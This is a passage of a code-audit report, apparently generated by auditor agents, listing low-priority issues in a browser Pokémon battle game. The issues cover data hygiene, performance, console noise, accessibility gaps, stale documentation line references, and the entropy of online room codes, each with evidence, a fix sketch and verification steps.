**Blast radius**: None at runtime — the flag is just inert bytes in the JSON. It's a low-priority data-hygiene concern: future contributors may add a poke-ball entry and forget the (unused) flag, or be confused about which catalog is authoritative. Doc/maintenance friction only.

**Fix sketch**: Either (a) strip the `isPokeball` field from `data/items.json` as part of a periodic data-cleanup pass; or (b) wire the engine's ball-detection helpers (e.g., `_ballChip` flows, `applyBallMultiplier`) to read from the data file's `isPokeball` instead of the ad-hoc `kind:'ball'` rows in `POKEMART_ITEMS`. Option (b) consolidates ball-knowledge into one place but is a non-trivial refactor; option (a) is a one-liner script.

**Verification**: After (a): `grep -c isPokeball data/items.json` returns 0. After (b): boot a wild encounter, throw a Quick Ball at turn 1 — confirm the multiplier still triggers via the new lookup path.

---

## <a id="ISSUE-042"></a> ISSUE-042: 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler

---
id: ISSUE-042
severity: P3
category: data
anchor_symbol: items.json
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 3ebf781a4419
confidence: medium
status: open
---

**Title**: 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler

**Evidence**:
```js
// items.json gen 9 entries — all marked isNonstandard:"Past":
// bitterberry, burntberry, goldberry, iceberry, mintberry, miracleberry,
// mysteryberry, przcureberry, psncureberry
$ grep -E "Bitter Berry|Burnt Berry|Gold Berry|Ice Berry|Mint Berry|Miracle Berry|Mystery Berry|PRZ Cure Berry|PSN Cure Berry" battle.html
# (no matches)
```

**Repro**: Iterate `data/items.json` flat for `isBerry: true`; for each berry name, grep `battle.html`. 68 of 77 distinct berries have at least one name reference (Sitrus, Lum, Salac, Liechi, ...). The remaining 9 are all `isNonstandard: "Past"` entries that were renamed/replaced in gen3+ (Gold Berry → Sitrus Berry, etc.).

**Blast radius**: None today — these berries cannot be held in the gen9-only engine path. The risk is purely hypothetical (a future "play gen2 OU" mode would silently no-op them). The dataset is internally consistent with the `isNonstandard:"Past"` marker.

**Fix sketch**: Optional cleanup — keep them as documented past-only data; or, if a multi-gen toggle is ever added, ship a name-aliasing table mapping legacy berries to their modern equivalents in the engine's berry handler. No action required today.

**Verification**: Decide whether to keep or alias; the current `isNonstandard:"Past"` is correctly signalling "do not instantiate."

---

## <a id="ISSUE-043"></a> ISSUE-043: Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target**

---
id: ISSUE-043
severity: P3
category: perf
anchor_symbol: loadEngine
current_line_hint: 52
file: tests/helpers/load-engine.js
agents: [performance-profiler]
fingerprint: 28e451a73726
confidence: high
status: open
---

**Title**: Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target**

**Evidence**: `tests/reports/perf.md` (this run, ISO 2026-05-22T07:18:54Z) reports `Cold start: 2854 ms (target: < 5000 ms in jsdom)`. Repeated trial: 2885 ms. The performance-profiler mandate (`agents/performance-profiler.md` line 17) sets the target at **< 200 ms under jsdom**. The harness self-report in `perf-bench.mjs:112` has been silently relaxed to `< 5000 ms` to mask this.

**Repro**: `time node -e 'import("./tests/helpers/load-engine.js").then(m => m.loadEngine()).then(() => console.log("ok"))'` measures ≈ 3 seconds.

**Blast radius**: The mandate's 200 ms target is unrealistic — jsdom has to parse ~50k lines of inlined battle.html, then the engine `loadGameData` synchronously parses 1380 species, 954 moves, 583 items, 314 abilities, 1147 build entries from JSON/CSV. The real bottleneck is JSON.parse + JSDOM document construction, both of which are largely fixed-cost. **Either the target needs updating** (the harness self-report at < 5 s is more realistic for jsdom) **or the engine should split eager loading into lazy/on-demand parsing**. In production browsers the boot is ~1.5–2 s and is hidden behind a splash; this is not user-visible. So this is a **target-mismatch finding**, not a performance regression: clarify which number the project actually targets.

**Fix sketch**: Either (a) update `agents/performance-profiler.md` to set the realistic target at `< 5 s in jsdom / < 2.5 s in production`, or (b) add a flag to `loadGameData` to skip parsing of unused data tables (e.g., the 748 illegal/end-game builds) during test boot.

**Verification**: Either the mandate target is updated to a realistic value, or `loadGameData` gains a `{ lazyBuilds: true }` option and `loadEngine.js` passes it.

---

## <a id="ISSUE-044"></a> ISSUE-044: `console.log` cluster in battle.html — debug noise in shipped code

---
id: ISSUE-044
severity: P3
category: dx
anchor_symbol: loadGameData
current_line_hint: ~9172
file: battle.html
agents: [consistency-auditor]
fingerprint: 2665d2131c90
confidence: high
status: open
---

**Title**: `console.log` cluster in battle.html — debug noise in shipped code

**Evidence**:
```js
// 19 console.log sites in battle.html — most under window.__DEBUG_* gates or under
// dev-only seeders. Worst-offender (always-on) sites:
// L9082  console.log('[SpriteScale] enrichBaseStatsHeightsFromDex: heightM added for ' + n + ' species');
// L9172  console.log(`[Data] Loaded ${...} species, ${...} moves, ${...} items, ${...} abilities, ${...} natures`);
// L9342  console.log(`[CSV] Loaded builds for ${Object.keys(csvBuilds).length} Pokémon ...`);
// L9399  console.log(`[CSV] API fallback loaded builds for ${...}`);
// L10939 console.log(`[Smogon] Loaded gen${gen} sets from local file`);
// L10945 console.log(`[Smogon] Loaded gen${gen} sets from pkmn.cc API`);
```

**Repro**: Open battle.html in a browser, open the console — `[Data] Loaded …` and friends greet every visitor on every cold load.

**Blast radius**: Polish only. Shipped console noise distracts from real diagnostics during incident triage. Note: console.log entries inside `__storyXxxTest` / `seedStoryXxx` / `balanceAudit` / `testmoves` are intentional (dev seeders) and should NOT be stripped.

**Fix sketch**: Gate the 5-6 always-on data-load logs behind a `window.__DEBUG_LOADS` flag (the SpriteScale / dex probe pattern already does this — copy it). Keep the dev-seeder logs as-is.

**Verification**: Cold load battle.html in a browser, console should be empty unless `?debug=1` or `__DEBUG_LOADS=true`.

---

## <a id="ISSUE-045"></a> ISSUE-045: Online Host/Join form labels are not programmatically associated with their inputs

---
id: ISSUE-045
severity: P3
category: a11y
anchor_symbol: modal-online-host
current_line_hint: ~7637
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: bdcd17777e9c
confidence: high
status: open
---

**Title**: Online Host/Join form labels are not programmatically associated with their inputs

**Evidence**:
```html
<!-- modal-online-host at ~7637 -->
<label style="display:block;font-size:12px;margin:10px 0 4px;">Your display name</label>
<input id="online-host-name" maxlength="24" placeholder="Host" style="…">

<!-- modal-online-pvp at ~7673 -->
<label style="display:block;font-size:12px;margin:8px 0 4px;">Your name (leaderboard)</label>
<input id="online-join-name" maxlength="24" placeholder="Trainer" style="…">
<label style="display:block;font-size:12px;margin:10px 0 4px;">Room code</label>
<input id="online-join-code" maxlength="8" style="…">
```

The `<label>` elements are visually adjacent to the inputs but missing `for="online-host-name"`/etc., and the inputs lack `aria-labelledby`/`aria-label`. SR users hear "edit text" with no name; clicking the label does not focus the input. Contrast with the trainer-create form at ~8370 which uses the wrapping-`<label>` pattern correctly.

**Repro**: Open Online → Host with VoiceOver → Tab to first text field → announced as "edit text" with no name.

**Blast radius**: Two modals, three inputs. Small surface but trivial to fix and a common heuristic that linting catches.

**Fix sketch**: Either add `for="online-host-name"` (etc.) on the labels, or wrap each label/input pair into a single `<label>` element following the pattern used in `screen-story-trainercreate`.

**Verification**: SR announces "Your display name, edit text" on focus; clicking the label focuses the input.

---

## <a id="ISSUE-046"></a> ISSUE-046: `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median

---
id: ISSUE-046
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: 24269
file: battle.html
agents: [performance-profiler]
fingerprint: 4cae7cf40971
confidence: high
status: open
---

**Title**: `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median

**Evidence**: drill-down via `scripts/debug/_repro/parse-move-drill.mjs` (boots harness, calls `parseMoveEffects(attacker, defender, move, true)` for all 950 moves with valid mons):
```
Total moves measured: 950
Median (all):          0.014 ms
Median (damaging):     0.014 ms  N=679
Median (status):       0.014 ms  N=271
Median (has secondary):0.017 ms  N=203
Median (no secondary): 0.013 ms  N=747

Top 10 slowest:
  3.463 ms  Status  secondary=false  Clangorous Soul
  3.396 ms  Status  secondary=false  Acid Armor
  3.381 ms  Status  secondary=false  Baby-Doll Eyes
  2.819 ms  Special secondary=true   Night Daze
  2.557 ms  Special secondary=false  10,000,000 Volt Thunderbolt
  2.128 ms  Special secondary=false  Incinerate
  1.963 ms  Status  secondary=false  Calm Mind
  1.851 ms  Status  secondary=false  Extreme Evoboost
  1.824 ms  Status  secondary=false  Bulk Up
  1.808 ms  Status  secondary=false  Shell Smash

Bottom 5 fastest: ~0.011 ms
```
Fastest:slowest ratio ≈ 0.011 → 3.46 = **315×**. The mandate's threshold is >10× variance → P3 finding.

**Repro**: `node scripts/debug/_repro/parse-move-drill.mjs` (script is in the gitignored `_repro/` folder; reproducible from the snippet documented here).

**Blast radius**: At normal sub-millisecond times these spikes are invisible. But (a) Clangorous Soul, Calm Mind, Bulk Up, Shell Smash, Acid Armor are setup moves used heavily in trainer sets, and they all involve **multi-stat boost loops** with logMsg/updateUI sequences — those are the slowest. (b) JSDOM happens to evaluate updateUI's DOM mutations cheaply; in a real browser those same moves will pay real layout/paint cost, so the relative spike could grow. (c) The top three are all `Status` moves with no secondary, suggesting the slow path is the boost-stage loop, not the secondary-effect branch. Status moves are NOT slower than damaging moves on the median — only the multi-stat-boost subset is.

**Fix sketch**: Profile Clangorous Soul (boosts ATK/DEF/SPA/SPD/SPE by +1, costs 33% HP) — that's 5 sequential `changeStage` calls + the HP cut + a logMsg. If the cost is dominated by `updateUI` being called inside `changeStage`, batch the UI update once at the end. If the cost is `logMsg` overhead per stage, that suggests the per-message channel switching path is the hot spot. Not urgent — even the worst move is 3.5 ms, well under any human-perceptible threshold in jsdom.

**Verification**: Re-run the drill script after any optimization. The expectation is the slowest moves drop into the sub-millisecond range and the variance ratio falls below 20×.

---

## <a id="ISSUE-047"></a> ISSUE-047: 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded

---
id: ISSUE-047
severity: P3
category: a11y
anchor_symbol: prefers-reduced-motion
current_line_hint: ~58
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b14deb83ca98
confidence: high
status: open
---

**Title**: 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded

**Evidence**:
```
$ grep -cE '@keyframes' battle.html
129
$ grep -cE 'prefers-reduced-motion' battle.html
5
$ grep -nE 'prefers-reduced-motion' battle.html
58:        @media (prefers-reduced-motion: reduce) {           # confetti, badge, rotate icon, hp-critical (4 rules)
5383:       @media (prefers-reduced-motion: reduce) {           # casino flip/wheel/slots/jackpot
6206:       @media (prefers-reduced-motion: reduce) {           # screen-trans + bottom-sheet
8696:        if (… '(prefers-reduced-motion: reduce)').matches) return;   # one-off in JS
26796:                try { return !!(… '(prefers-reduced-motion: reduce)').matches); }  # StoryFx isReduced flag
```

Storage of the StoryFx flag (line 26796) covers JS-driven sequences nicely, but pure CSS animations escape it. Examples of unguarded multi-second animations: `storyTutorialOverlayIn` / `storyTutorialSpriteIn` / `storyTutorialNameIn` / `storyTutorialDialogIn` (tutorial reveal cascade, lines ~4267-4296), `storyCatchMasterPulse` (Master Ball, infinite 2.2s loop, line ~1912), `storyBadgePulse` (victory badge — the line-60 override hits `.story-victory-badge-slot` but the `@keyframes storyBadgePulse` continues running on any other element that uses it).

**Repro**: macOS System Settings → Accessibility → Reduce Motion → On. Trigger first wild — sprite still scales & translates from off-screen; Master Ball still pulses every 2.2 s.

**Blast radius**: Vestibular-disorder users get the same motion onslaught as the default theme. Infinite pulse loops are particularly hostile.

**Fix sketch**: Wrap CSS animation declarations in a single `@media (prefers-reduced-motion: reduce) { *[class*="story-tutorial-"] { animation: none !important; } .story-catch-ball--master { animation: none !important; box-shadow: 0 0 14px rgba(206,147,216,0.55) !important; } … }` block. Audit the 129 keyframes and short-list the ≥800 ms / infinite ones (probably ~25 selectors).

**Verification**: With reduced-motion on, no element on the catch screen or tutorial overlay animates for >100 ms.

---

## <a id="ISSUE-048"></a> ISSUE-048: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

---
id: ISSUE-048
severity: P3
category: bug
anchor_symbol: randomCode
current_line_hint: ~44
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: aee012742c28
confidence: medium
status: open
---

**Title**: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

**Evidence**:
```js
// online-pvp.js L44-49
function randomCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';   // 32 chars (no I/O/1/0 → ambiguous-safe)
    let s = '';
    for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
}
// L341-351 retry loop tolerates 8 collisions before giving up.
```

**Repro**: 32^6 = ~1.07 billion codes; birthday paradox says collision probability hits 50% at ~37K codes simultaneously in flight. With 8 retries the practical ceiling is much higher (each attempt has 1 - codes_in_use/1e9 ≈ 1 success prob even at 1M live rooms), so this is fine *for correctness*. The real concern is enumeration: an attacker who can call `fetchRoomByCode(code)` (no rate limit visible) can brute-force the ~1B codespace. At 10 lookups/sec from a single client and the open SELECT policy, finding a specific 6-char code takes a year on average; finding *any* live room takes seconds (~1000 rooms / 1B = ~1M attempts = 27 hours). With the open RLS, the attacker can short-circuit by `select('code') from pvp_rooms` instead — making the codespace strength irrelevant.

**Blast radius**: Defensive. Under tightened RLS (see the P0/P1 RLS findings), the code becomes the secret that gates joining; at that point, 30-bit entropy is shaky for a feature meant to defend against opportunistic eavesdroppers. Realistically, room codes need to be share-friendly (length 6, no ambiguous chars) so the 30 bits cap is by design.

**Fix sketch**: For correctness alone, no change needed (the retry on 23505 handles collisions). For privacy of in-progress matches: combine the code with an opaque per-room access token returned from `createRoom` and required as a header on every read (see the P1 SELECT-RLS finding's RPC design). The code stays human-shareable; the token is the real secret.

**Verification**: Existing integration test `tests/integration/pvp-stub.test.js:101-111` samples 1000 codes and asserts ≥990 unique — this validates collision rate, not unguessability.

---

## <a id="ISSUE-049"></a> ISSUE-049: All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"`

---
id: ISSUE-049
severity: P3
category: a11y
anchor_symbol: screen-landmarks
current_line_hint: ~7400
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: ade33e34d4e7
confidence: high
status: open
---

**Title**: All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"`

**Evidence**:
```
$ grep -nE 'id="screen-[a-z-]+"' battle.html | head -5
7400:    <div id="screen-menu" class="screen active">
7490:    <div id="screen-draft" class="screen hidden" …>
7786:    <div id="screen-story-menu" class="screen hidden story-screen-outer">
7811:    <div id="screen-story-city" class="screen hidden story-screen-root" …>
7856:    <div id="screen-story-professor" class="screen hidden story-screen-root" …>
…
8496:    <div id="screen-battle" class="screen hidden">
```

24 top-level screens (menu, draft, story-menu, story-city, story-shop, story-tutor, story-evtrainer, story-pokemoncenter, story-casino, story-catch, story-link, story-evolab, story-gameover, story-artifacts, story-tester, story-trainercreate, collection, battle, plus 6 more). None use a landmark element. Screen readers see "main content" as one undifferentiated blob: the assistive nav-by-landmark shortcut produces zero hits.

**Repro**: Open VoiceOver rotor (VO+U) → Landmarks. Nothing for any screen.

**Blast radius**: One of the cheapest a11y wins available — affects landmark navigation across the entire game.

**Fix sketch**: At minimum, change the currently-active `#screen-*` to behave as `<main>` (only one main per page). Mechanically: keep the `<div>` tag but add `role="main"` to whichever screen is active (toggle in the existing show-screen helper), and `role="region" aria-labelledby="<screen-heading-id>"` on the rest. Each screen already has an `<h1>`/`<h2>` near the top — give it an id and label by it.

**Verification**: VoiceOver landmark count ≥ 1; rotor labels match the active screen name.

---

## <a id="ISSUE-050"></a> ISSUE-050: Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon`

---
id: ISSUE-050
severity: P3
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~28028
file: battle.html
agents: [consistency-auditor]
fingerprint: 908671f1a52f
confidence: high
status: open
---

**Title**: Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon`

**Evidence**:
```js
// L28028  '...,Power Up','Enter Pokemon League']],          ← action key
// L36151                       'Enter the Pokémon League'   ← UI label
// L28047  if (!Array.isArray(actions) || actions.includes('Pokemon Fan Club')) continue;
// L36242  makeActionBtn('💖 Pokémon Fan Club', ...           ← UI label
```

**Repro**: `grep -nE '\\bPokemon\\b' battle.html | grep -v 'Pokémon'` — 19 hits, 2 of which are user-string-adjacent action keys (rest are CSS / code comments).

**Blast radius**: None for users — internal keys, not displayed. Style consistency only. Risk: a future contributor updates one of these two strings to use the diacritic and forgets the matched site, breaking the `actions.includes(...)` check.

**Fix sketch**: Either (a) leave both as-is and document that internal action keys deliberately avoid the diacritic, or (b) rename both keys to use `Pokémon` + update both `actions.includes(...)` callsites. (a) is the lower-risk fix.

**Verification**: After rename, ensure City 9's "Enter Pokémon League" button still appears (the gating check at L36137 must match).

---

## <a id="ISSUE-051"></a> ISSUE-051: 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines)

---
id: ISSUE-051
severity: P3
category: dx
anchor_symbol: STORY_MODE_CATCH_INTEGRATION_RISK.md
file: docs/STORY_MODE_CATCH_INTEGRATION_RISK.md
agents: [spec-drift-auditor]
fingerprint: 3c47a061e632
confidence: high
status: open
---

**Title**: 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines)

**Evidence**:
```
doc-line  | symbol hinted                      | claimed | actual
40        | badges, _storyProgressFactor       | 22481   | 13168 / 31385
41        | _rivalScoreAttackTypeVsParty       | 22706   | 31604
43        | hasTeamRoom, rivalGateActive       | 23611   | 35922 / 35940
47        | isFull, rolls                      | 24317   | 36885 / 36913
52        | usedNames, usedFamilies            | 24515   | 14180 / 36947
54        | sm                                 | 26484   | 13166
```
This doc is the largest single source of drifted refs in the report (24 of 50 total drifts).

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '25,55p' tests/reports/spec-drift.md`.

**Blast radius**: A doc named "risk" implies it should be read carefully on every catch-pipeline change; stale anchors actively mislead readers tracking how the catch flow interacts with Rival logic, save schema, and PC capacity.

**Fix sketch**: Single sweep through this doc, converting `battle.html:LINE` patterns to `(SYMBOL)` annotations. Special attention to lines 40-55, which form the spec's high-density anchor block. Add the convention to `docs/STORY_MODE_DESIGN_DECISIONS.md` as "rule: never quote line numbers in design docs".

**Verification**: `node scripts/debug/spec-drift.mjs` reports ≤2 drift entries under this doc.

---

## <a id="ISSUE-052"></a> ISSUE-052: 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines)

---
id: ISSUE-052
severity: P3
category: dx
anchor_symbol: STORY_MODE_FLOW.md
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: a2c0649750f6
confidence: high
status: open
---

**Title**: 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines)

**Evidence**:
```
STORY_MODE_FLOW.md doc-line  | claimed battle.html line | actual location
 47 (STORY_EVENTS_RAW)       | 21273                    | 27969 (+6696)
117 (catchRate, getMonGrade) | 28560                    | 13062 (-15498)
217 (STORY_EVENTS_RAW)       | 30702                    | 27969 (-2733)
576 (makeWildBuild)          | 34883                    | 39858 (+4975)
```
Full report at `tests/reports/spec-drift.md`. Only 1/10 refs in this doc still resolves cleanly via the symbol table — the rest reference symbols at lines that no longer host them (or have no inferrable symbol).

**Repro**: `node scripts/debug/spec-drift.mjs && head -25 tests/reports/spec-drift.md`.

**Blast radius**: Anyone who follows STORY_MODE_FLOW.md's line numbers to inspect the implementation lands in unrelated code. Docs still readable for *symbol* references, just not line jumps.

**Fix sketch**: One sweep: re-resolve every `battle.html:LINE` via `find-anchor`, rewrite as `battle.html` (no line) plus `(`SYMBOL`)`. Future-proof: never embed line numbers in design docs — they drift the moment a function is added above.

**Verification**: After sweep, `node scripts/debug/spec-drift.mjs` reports ≤1 drift entry under STORY_MODE_FLOW.md.

---

## <a id="ISSUE-053"></a> ISSUE-053: 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines)

---
id: ISSUE-053
severity: P3
category: dx
anchor_symbol: STORY_NARRATIVE_VARIANTS.md
file: docs/STORY_NARRATIVE_VARIANTS.md
agents: [spec-drift-auditor]
fingerprint: b63a7fd17310
confidence: high
status: open
---

**Title**: 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines)

**Evidence**:
```
doc-line | symbol                       | claimed | actual
339      | pending                      | 30916   | 17218
600      | STORY_BEATS                  | 30566   | 33787
601      | STORY_COLD_OPENS             | 30592   | 33813
602      | STORYLINE_VARIANTS           | 30815   | 35011
606      | MYSTERY_FIGURE_IDENTITIES    | 26426   | 28705
607      | _showIntroRivalColdOpen      | 33069   | 37866
```
The variant system is the most actively edited area of battle.html (CHANGELOG 2026-05-20: "12 sections all additive"), so line refs drift fastest here.

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '60,75p' tests/reports/spec-drift.md`.

**Blast radius**: This doc is the canonical guide for adding a 9th storyline variant; readers following its anchors land in wrong functions. STORY_BEATS / STORY_COLD_OPENS / STORYLINE_VARIANTS are the three keystone consts a variant author touches.

**Fix sketch**: Re-resolve via `find-anchor`, replace with symbol-only annotations. The six symbols here are stable in the index — re-link them and the doc is self-healing across future refactors.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drift entries under this doc.

---

## <a id="ISSUE-054"></a> ISSUE-054: Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance

---
id: ISSUE-054
severity: P3
category: dx
anchor_symbol: STORY_TUTORIAL_SCENES
current_line_hint: ~34785
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 92a8d59337aa
confidence: medium
status: open
---

**Title**: Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance

**Evidence**:
```js
// STORY_TUTORIAL_SCENES.firstTrainerBattle at ~34786
firstTrainerBattle: {
    metaKey: 'tutorial-first-trainer-battle',
    sprite: 'Oak', name: 'Prof. Oak', nameplate: 'Your First Fight',
    lines: [
        '"Two trainers, two teams, one road. That\'s a battle."',
        '"Tap ⚔ FIGHT to pick a move. Each one has its own PP, so the strongest hit isn\'t always the right one. Physical, Special, and Status all read off different stats — type matters more than raw level. Super-effective doubles your damage; the wrong type can half it."',
        '"🔴 POKÉMON swaps your active partner — it costs your turn, so use it on a read. 🎒 BAG burns an item. 🏃 RUN forfeits the fight and a slice of gold. Keep that HP bar green."'
    ]
}
```

Each tutorial dumps three multi-clause sentences in one frame with no per-line "Next" pacing — the player gets all 60-100 words at once and a single "Continue →" button. There's no voice/SFX channel, no incremental reveal, no "I've read this, don't show again" toggle (the dedupe is automatic via `tipsShown`, which is good, but means the player can't *intentionally* re-read a tutorial). For users who read slowly or use a screen reader, the text dump is announced as one block; SR users can't pause within it.

**Repro**: Trigger `firstTrainerBattle` — read it in <5s; nothing tracks reading progress.

**Blast radius**: 10+ first-time scenes. The tutorial is the single most important touchpoint for player retention; a text-wall here is also a missed opportunity to teach type matchups via demo animation.

**Fix sketch**: Convert `lines:` into a per-line reveal — render only the first line, advance on Continue/Tap. Add an SR-friendly `aria-live="polite"` announcement per line. Optionally: a "Re-show last tutorial" entry in Settings (the `tipsShown` flag is already keyed by `metaKey` so this is one-line). A subtle 8-bit "blip" SFX per line would also help engagement (already in use elsewhere for shop chimes — `StoryFx`).

**Verification**: Open a tutorial → only line 1 visible; Continue advances; final continue dismisses.

---

## <a id="ISSUE-055"></a> ISSUE-055: Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline

---
id: ISSUE-055
severity: P3
category: a11y
anchor_symbol: story-shop-buy-btn
current_line_hint: ~2267
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a93e15e90227
confidence: medium
status: open
---

**Title**: Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline

**Evidence**:
```css
.story-shop-buy-btn {
    min-height:34px; padding:6px 14px; font-size:12px; …
}
/* mobile override at ~5667 */
@media (max-width: 480px) {
    .story-shop-buy-btn { min-height: 42px !important; padding: 8px 18px !important; … }
}
```

The Mart, Department Store, Artifact Shop, Tutor, Colress, Event Trainer, Fanclub buy buttons all share `.story-shop-buy-btn` — 34 px desktop, 42 px mobile. The 42 px is short of the WCAG 2.1 SC 2.5.5 (AAA) target-size 44×44 minimum and the more recent SC 2.5.8 (AA) 24×24 floor for "no spacing exemption". Adjacent rows make accidental taps likely. Compare to the battle command grid (60 px) and the modal-summary tabs (44 px) — both meet the bar.

**Repro**: Open Mart on a phone, tap "Buy" — possible to hit the adjacent item's button when scrolling.

**Blast radius**: Every shop. The mobile shop experience is a P2 surface (story mode is the polish target, and most run time outside battles is spent in shops).

**Fix sketch**: Bump the `@media (max-width: 480px)` override to `min-height: 44px`. Also widen the row gap from `10px` to `12px` so the spacing exemption applies.

**Verification**: DevTools mobile mode at 360px width → measure the buy button bounding box ≥ 44×44.

---

## <a id="ISSUE-056"></a> ISSUE-056: Tutorial overlay's four-stage entrance animation has no reduced-motion fallback

---
id: ISSUE-056
severity: P3
category: a11y
anchor_symbol: story-tutorial-overlay
current_line_hint: ~4256
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: dcc6311c0e55
confidence: medium
status: open
---

**Title**: Tutorial overlay's four-stage entrance animation has no reduced-motion fallback

**Evidence**:
```css
.story-tutorial-overlay { …animation: storyTutorialOverlayIn 0.32s ease-out both; }
.story-tutorial-sprite  { …animation: storyTutorialSpriteIn 0.55s cubic-bezier(0.18,0.9,0.32,1.18) both; }
.story-tutorial-name    { …animation: storyTutorialNameIn 0.4s ease-out 0.25s both; }
.story-tutorial-dialog-host { …animation: storyTutorialDialogIn 0.5s ease-out 0.4s both; }
.story-tutorial-continue { animation: storyTutorialNameIn 0.4s ease-out 0.7s both; }
```

The tutorial cascade plays four staggered animations totaling ~1.1s before the Continue button is even visible (it animates in last at 0.7s delay). With `prefers-reduced-motion: reduce`, none of these collapse — Sprite scaling/translate, fade-in cascades, all play at full intensity. The existing line-58 reduced-motion block targets confetti / victory-badge / rotate-icon / hp-critical only.

**Repro**: Reduced motion on, trigger any first-time tutorial → sprite still bounces in, name slides down, dialog scales up, button fades in.

**Blast radius**: Pairs with the broader prefers-reduced-motion finding but is highlighted separately because tutorials are the load-bearing on-boarding moment.

**Fix sketch**: Add to existing line-58 block: `.story-tutorial-overlay, .story-tutorial-overlay * { animation: none !important; opacity: 1 !important; transform: none !important; }`. Or scope a fresh `@media (prefers-reduced-motion: reduce) { .story-tutorial-overlay { animation: none; } .story-tutorial-sprite, .story-tutorial-name, .story-tutorial-dialog-host, .story-tutorial-continue { animation: none; } }` block near line 4308.

**Verification**: With reduced motion on, all four elements render instantly when the overlay mounts.

---

## <a id="ISSUE-057"></a> ISSUE-057: Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile

---
id: ISSUE-057
severity: P3
category: a11y
anchor_symbol: storyCatchMasterPulse
current_line_hint: ~1908
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 679f436786d4
confidence: medium
status: open
---

**Title**: Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile

**Evidence**:
```css
.story-catch-ball--master {
    box-shadow: 0 0 14px rgba(206, 147, 216, 0.55), inset 0 0 14px rgba(206, 147, 216, 0.18) !important;
    animation: storyCatchMasterPulse 2.2s ease-in-out infinite;
}
@keyframes storyCatchMasterPulse {
    0%, 100% { box-shadow: 0 0 14px rgba(206, 147, 216, 0.55), inset 0 0 14px rgba(206, 147, 216, 0.18); }
    50%      { box-shadow: 0 0 22px rgba(206, 147, 216, 0.85), inset 0 0 18px rgba(206, 147, 216, 0.32); }
}
```

Contrast itself is fine: `#ce93d8` text on `rgba(20,28,40,0.6)` over a dark battle background gives ~7:1, passes WCAG AA. The accessibility issue is that the pulse is `infinite` with no `prefers-reduced-motion` carve-out. The catch screen typically holds the player's attention for 30-90 s while they read flee/catch percentages — that's ≥15 pulses of an eye-catching glow loop.

**Repro**: With reduced motion enabled (macOS / Windows / Firefox flag), open any wild encounter where you hold ≥1 Master Ball → button still pulses every 2.2s.

**Blast radius**: Vestibular / photosensitivity-sensitive users. Pairs with the broader reduced-motion finding.

**Fix sketch**: Inside an existing `prefers-reduced-motion` block (or a new one): `.story-catch-ball--master { animation: none !important; }`. Keep the static box-shadow so the affordance ("this ball is special") still reads.

**Verification**: Open catch screen with reduced motion → glow holds static.

---
